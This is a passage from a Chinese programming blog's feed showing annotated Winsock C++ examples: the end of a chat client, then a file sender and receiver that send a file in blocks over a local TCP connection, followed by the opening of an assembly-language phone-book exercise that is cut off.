class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 1. 初始化套接字模块，必须是网络程序中第一个调用的函数(搜索信号)</span></span><br><span class="line">WSADATA wsadata = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">int</span> result = WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsadata);</span><br><span class="line">check_result(!result &amp;&amp; wsadata.wVersion == <span class="number">0x0202</span>, <span class="string">&quot;套接字环境初始化失败!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 创建一个套接字，应该保存[IP:PORT](买一部手机)</span></span><br><span class="line"><span class="comment">//参数分别是使用的协议种类，数据传输方式以及协议类型</span></span><br><span class="line">SOCKET client = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line">check_result(client != INVALID_SOCKET, <span class="string">&quot;套接字创建失败!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 将套接字绑定到指定的 ip 地址和端口(安装手机卡)</span></span><br><span class="line">SOCKADDR_IN server_addr = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">server_addr.sin_family = AF_INET;<span class="comment">// 协议</span></span><br><span class="line">server_addr.sin_port = htons(<span class="number">0x1515</span>);<span class="comment">// 端口</span></span><br><span class="line">inet_pton(AF_INET, <span class="string">&quot;127.0.0.1&quot;</span>, &amp;server_addr.sin_addr);</span><br><span class="line">result = connect(client, (SOCKADDR*)&amp;server_addr, <span class="keyword">sizeof</span>(server_addr));</span><br><span class="line">check_result(result != SOCKET_ERROR, <span class="string">&quot;套接字连接失败!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 给服务器传递一个用户名</span></span><br><span class="line"><span class="keyword">char</span> buffer[<span class="number">0x100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">scanf_s(<span class="string">&quot;%s&quot;</span>, buffer, <span class="number">0x100</span>);</span><br><span class="line">send(client, buffer, <span class="number">0x100</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. 创建一个线程，用于执行信息的接收操作</span></span><br><span class="line">CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, RecvThread, (LPVOID)client, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5. 使用 send 函数向服务器发送消息</span></span><br><span class="line"><span class="keyword">while</span> (scanf_s(<span class="string">&quot;%s&quot;</span>, buffer, <span class="number">0x100</span>) == <span class="number">1</span></span><br><span class="line">&amp;&amp; <span class="built_in">strcmp</span>(buffer, <span class="string">&quot;quit&quot;</span>))</span><br><span class="line">send(client, buffer, <span class="built_in">strlen</span>(buffer) + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 6. 当数据处理结束之后，需要断开连接</span></span><br><span class="line">closesocket(client);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 7. 清理套接字模块坏境</span></span><br><span class="line">WSACleanup();</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="案例2"><a href="#案例2" class="headerlink" title="案例2"></a>案例2</h2><h3 id="文件发送端"><a href="#文件发送端" class="headerlink" title="文件发送端"></a>文件发送端</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 0. 添加必要的头文件，并且链接到相应的静态库</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ws2tcpip.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 块的大小，</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> block_size = <span class="number">1024</span>*<span class="number">1024</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 描述文件信息的结构体</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">MY_FILE_INFO</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">char</span> name[<span class="number">0x100</span>];<span class="comment">// 文件名称</span></span><br><span class="line"><span class="keyword">int</span> block_count;<span class="comment">// 块的数量</span></span><br><span class="line">&#125; MY_FILE_INFO, * PMY_FILE_INFO;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 描述块信息的结构体</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">BLOCK_INFO</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> index;<span class="comment">// 当前是文件中的第几部分</span></span><br><span class="line"><span class="keyword">char</span> data[block_size];<span class="comment">// 每一个块的内容</span></span><br><span class="line">DWORD size;<span class="comment">// 当前实际发送的长度</span></span><br><span class="line">&#125; BLOCK_INFO;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查函数的执行结果是否正确</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">check_result</span><span class="params">(<span class="keyword">bool</span> result, <span class="keyword">const</span> <span class="keyword">char</span>* msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 如果传入的表达式位假，意味着出错</span></span><br><span class="line"><span class="keyword">if</span> (result == <span class="literal">false</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;error: %s\n&quot;</span>, msg);</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>); <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 先发送文件的信息到接收方</span></span><br><span class="line"><span class="function">HANDLE <span class="title">send_file_info</span><span class="params">(SOCKET sock, LPCSTR filename, PMY_FILE_INFO info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 如果目标文件存在，就以只读方式打开并允许别人访问</span></span><br><span class="line">HANDLE file = CreateFileA(filename, GENERIC_READ, FILE_SHARE_READ, </span><br><span class="line"><span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取到文件的大小，用于计算一共要发送的次数</span></span><br><span class="line">DWORD size = GetFileSize(file, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据大小计算一共有多少个块， </span></span><br><span class="line"><span class="keyword">int</span> count = size % block_size == <span class="number">0</span> ? size / block_size : size / block_size + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 组合成一个结构体传递给接收方</span></span><br><span class="line">info-&gt;block_count = count;</span><br><span class="line"><span class="built_in">memcpy</span>(info-&gt;name, filename, <span class="built_in">strlen</span>(filename) + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 发送给接收方</span></span><br><span class="line">send(sock, (<span class="keyword">char</span>*)info, <span class="keyword">sizeof</span>(*info), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> file;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 发送文件的内容</span></span><br><span class="line"><span class="function">VOID <span class="title">send_file_data</span><span class="params">(SOCKET sock, HANDLE file, PMY_FILE_INFO info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; info-&gt;block_count; ++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 0. 为每一个块创建结构体进行描述</span></span><br><span class="line">BLOCK_INFO* block_info = <span class="keyword">new</span> BLOCK_INFO&#123; i &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 读取每一个固定大小的块，并发送</span></span><br><span class="line">ReadFile(file, block_info-&gt;data, block_size, &amp;block_info-&gt;size, <span class="literal">NULL</span>);</span><br><span class="line">send(sock, (<span class="keyword">char</span>*)block_info, <span class="keyword">sizeof</span>(BLOCK_INFO), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">Sleep(<span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">CloseHandle(file);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 1. 初始化套接字模块，必须是网络程序中第一个调用的函数(搜索信号)</span></span><br><span class="line">WSADATA wsadata = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">int</span> result = WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsadata);</span><br><span class="line">check_result(!result &amp;&amp; wsadata.wVersion == <span class="number">0x0202</span>, <span class="string">&quot;套接字环境初始化失败!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 创建一个套接字，应该保存[IP:PORT](买一部手机)</span></span><br><span class="line"><span class="comment">//参数分别是使用的协议种类，数据传输方式以及协议类型</span></span><br><span class="line">SOCKET server = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line">check_result(server != INVALID_SOCKET, <span class="string">&quot;套接字创建失败!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 将套接字绑定到指定的 ip 地址和端口(安装手机卡)</span></span><br><span class="line">SOCKADDR_IN server_addr = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">server_addr.sin_family = AF_INET;<span class="comment">// 协议</span></span><br><span class="line">server_addr.sin_port = htons(<span class="number">0x1515</span>);<span class="comment">// 端口</span></span><br><span class="line">inet_pton(AF_INET, <span class="string">&quot;127.0.0.1&quot;</span>, &amp;server_addr.sin_addr);</span><br><span class="line">result = bind(server, (SOCKADDR*)&amp;server_addr, <span class="keyword">sizeof</span>(server_addr));</span><br><span class="line">check_result(result != SOCKET_ERROR, <span class="string">&quot;套接字绑定失败!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. 开启套接字的监听状态，第二个参数是同一时刻可以等待的客户端数量(开机)</span></span><br><span class="line">result = listen(server, SOMAXCONN);</span><br><span class="line">check_result(result != SOCKET_ERROR, <span class="string">&quot;套接字监听失败!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5. 等待客户端的连接，返回值是连接到的客户端(等接电话)</span></span><br><span class="line"><span class="keyword">int</span> size = <span class="keyword">sizeof</span>(SOCKADDR_IN);</span><br><span class="line">SOCKADDR_IN client_addr = &#123; <span class="number">0</span> &#125;;<span class="comment">// 用于接收客户端信息(来电显示)</span></span><br><span class="line">SOCKET client = accept(server, (SOCKADDR*)&amp;client_addr, &amp;size);</span><br><span class="line">check_result(client != INVALID_SOCKET, <span class="string">&quot;客户端接收失败!&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">MY_FILE_INFO info = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">HANDLE file = send_file_info(client, <span class="string">&quot;demo.exe&quot;</span>, &amp;info);</span><br><span class="line">send_file_data(client, file, &amp;info);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 7. 当数据处理结束之后，需要断开连接</span></span><br><span class="line">closesocket(client);</span><br><span class="line">closesocket(server);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 8. 清理套接字模块坏境</span></span><br><span class="line">WSACleanup();</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="文件接收端"><a href="#文件接收端" class="headerlink" title="文件接收端"></a>文件接收端</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 0. 添加必要的头文件，并且链接到相应的静态库</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ws2tcpip.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 块的大小</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> block_size = <span class="number">1024</span> * <span class="number">1024</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 描述文件信息的结构体</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">MY_FILE_INFO</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">char</span> name[<span class="number">0x100</span>];<span class="comment">// 文件名称</span></span><br><span class="line"><span class="keyword">int</span> block_count;<span class="comment">// 块的数量</span></span><br><span class="line">&#125; MY_FILE_INFO, *PMY_FILE_INFO;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 描述块信息的结构体</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">BLOCK_INFO</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> index;<span class="comment">// 当前是文件中的第几部分</span></span><br><span class="line"><span class="keyword">char</span> data[block_size];<span class="comment">// 每一个块的内容</span></span><br><span class="line"><span class="keyword">int</span> size;<span class="comment">// 当前实际发送的长度</span></span><br><span class="line">&#125; BLOCK_INFO;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查函数的执行结果是否正确</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">check_result</span><span class="params">(<span class="keyword">bool</span> result, <span class="keyword">const</span> <span class="keyword">char</span>* msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 如果传入的表达式位假，意味着出错</span></span><br><span class="line"><span class="keyword">if</span> (result == <span class="literal">false</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;error: %s\n&quot;</span>, msg);</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>); <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 先发送文件的信息到接收方</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">recv_file_info</span><span class="params">(SOCKET sock, PMY_FILE_INFO info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 接收结构体信息</span></span><br><span class="line">recv(sock, (<span class="keyword">char</span>*)info, <span class="keyword">sizeof</span>(*info), <span class="number">0</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s %d\n&quot;</span>, info-&gt;name, info-&gt;block_count);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 先发送文件的信息到接收方</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">recv_file_data</span><span class="params">(SOCKET sock, PMY_FILE_INFO info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 使用传递过来的名称创建一个新的文件</span></span><br><span class="line">HANDLE file = CreateFileA(info-&gt;name, GENERIC_WRITE, <span class="literal">NULL</span>,</span><br><span class="line"><span class="literal">NULL</span>, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过一个循环向其中写入数据</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; info-&gt;block_count; ++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 定义一个块信息的结构体，接收发送到的数据</span></span><br><span class="line">BLOCK_INFO* block_info = <span class="keyword">new</span> BLOCK_INFO&#123; <span class="number">0</span> &#125;;</span><br><span class="line">recv(sock, (<span class="keyword">char</span>*)block_info, <span class="keyword">sizeof</span>(BLOCK_INFO), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置文件指针的位置到相应的起始点</span></span><br><span class="line">SetFilePointer(file, block_size * block_info-&gt;index, <span class="number">0</span>, FILE_BEGIN);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 向文件内写入内容</span></span><br><span class="line">DWORD bytes = <span class="number">0</span>;</span><br><span class="line">WriteFile(file, block_info-&gt;data, block_info-&gt;size, &amp;bytes, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d 写入成功，大小为 %d\n&quot;</span>, block_info-&gt;index, bytes);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">CloseHandle(file);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 1. 初始化套接字模块，必须是网络程序中第一个调用的函数(搜索信号)</span></span><br><span class="line">WSADATA wsadata = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">int</span> result = WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsadata);</span><br><span class="line">check_result(!result &amp;&amp; wsadata.wVersion == <span class="number">0x0202</span>, <span class="string">&quot;套接字环境初始化失败!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 创建一个套接字，应该保存[IP:PORT](买一部手机)</span></span><br><span class="line"><span class="comment">//参数分别是使用的协议种类，数据传输方式以及协议类型</span></span><br><span class="line">SOCKET client = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line">check_result(client != INVALID_SOCKET, <span class="string">&quot;套接字创建失败!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 将套接字绑定到指定的 ip 地址和端口(安装手机卡)</span></span><br><span class="line">SOCKADDR_IN server_addr = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">server_addr.sin_family = AF_INET;<span class="comment">// 协议</span></span><br><span class="line">server_addr.sin_port = htons(<span class="number">0x1515</span>);<span class="comment">// 端口</span></span><br><span class="line">inet_pton(AF_INET, <span class="string">&quot;127.0.0.1&quot;</span>, &amp;server_addr.sin_addr);</span><br><span class="line">result = connect(client, (SOCKADDR*)&amp;server_addr, <span class="keyword">sizeof</span>(server_addr));</span><br><span class="line">check_result(result != SOCKET_ERROR, <span class="string">&quot;套接字绑定失败!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. 对于 TCP 程序通过 send 和 recv 收发数据，函数是阻塞</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">MY_FILE_INFO info = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">recv_file_info(client, &amp;info);</span><br><span class="line">recv_file_data(client, &amp;info);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 5. 当数据处理结束之后，需要断开连接</span></span><br><span class="line">closesocket(client);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 6. 清理套接字模块坏境</span></span><br><span class="line">WSACleanup();</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络 </tag>
            
            <tag> 编程 </tag>
            
            <tag> 套接字 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编语言————练习</title>
      <link href="2020/12/05/%E6%B1%87%E7%BC%96%E9%A1%B9%E7%9B%AE%E7%BB%83%E4%B9%A0/"/>
      <url>2020/12/05/%E6%B1%87%E7%BC%96%E9%A1%B9%E7%9B%AE%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="电话本"><a href="#电话本" class="headerlink" title="电话本"></a>电话本</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span 